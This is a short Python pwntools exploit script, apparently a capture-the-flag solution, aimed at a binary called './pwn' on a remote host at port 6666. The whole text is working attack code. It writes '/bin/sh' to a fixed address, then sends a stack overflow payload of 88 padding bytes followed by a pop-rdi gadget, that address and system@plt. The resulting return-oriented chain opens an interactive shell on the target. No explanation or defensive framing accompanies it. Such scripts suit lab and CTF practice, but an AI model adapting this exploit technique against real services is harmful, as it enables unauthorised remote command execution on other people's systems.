from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
p = remote('172.16.12.2',6666)
#p = process(name)
elf = ELF(name)

if args.G:
    gdb.attach(p)

sh_addr = 0x601060
pop_rdi = 0x4006c3
system_plt = 0x4004b0

p.sendline("/bin/sh\x00")

pay = b'a'*(88) + p64(pop_rdi) + p64(sh_addr) + p64(system_plt)
p.sendline(pay)
p.interactive()
